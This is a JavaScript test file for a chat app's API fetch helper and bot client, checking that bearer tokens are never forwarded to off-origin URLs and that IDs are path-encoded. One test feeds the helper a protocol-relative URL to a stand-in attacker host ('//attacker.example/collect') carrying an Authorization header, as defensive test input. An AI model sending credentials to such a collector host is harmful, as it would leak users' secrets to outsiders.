import test from "node:test";
import assert from "node:assert/strict";

import { Client } from "../../packages/bot/src/client.js";

test("API helper refuses external targets before forwarding authorization", async () => {
  const oldWindow = globalThis.window;
  const oldFetch = globalThis.fetch;
  const calls = [];
  globalThis.window = {
    location: {
      origin: "https://www.disband.dev",
      href: "https://www.disband.dev/app",
      protocol: "https:",
    },
  };
  globalThis.fetch = async (url, options) => {
    calls.push([url, options.headers.get("Authorization")]);
    return { ok: true };
  };

  try {
    const { apiFetch } = await import("../../src/lib/api.ts");
    await assert.rejects(
      apiFetch("//attacker.example/collect", { headers: { Authorization: "Bearer secret" } }),
      /configured Disband origin/,
    );
    assert.deepEqual(calls, []);

    await apiFetch("/api/test", { headers: { Authorization: "Bearer secret" } });
    assert.deepEqual(calls, [["/api/test", "Bearer secret"]]);
  } finally {
    globalThis.window = oldWindow;
    globalThis.fetch = oldFetch;
  }
});

test("bot one-time async handler errors are reported and IDs stay in one path segment", async () => {
  const client = new Client({ token: "test" });
  const errors = [];
  client.on("error", (error) => errors.push(error.message));
  client.once("messageCreate", async () => { throw new Error("handler failed"); });
  client._emit("messageCreate", {});
  await new Promise((resolve) => setImmediate(resolve));
  assert.deepEqual(errors, ["handler failed"]);

  client._rest.get = async (path) => {
    assert.equal(path, "/api/v1/channels/a%2Fb/messages?before=x%26y");
    return { messages: [] };
  };
  assert.deepEqual(await client.listMessages("a/b", { before: "x&y" }), []);
});
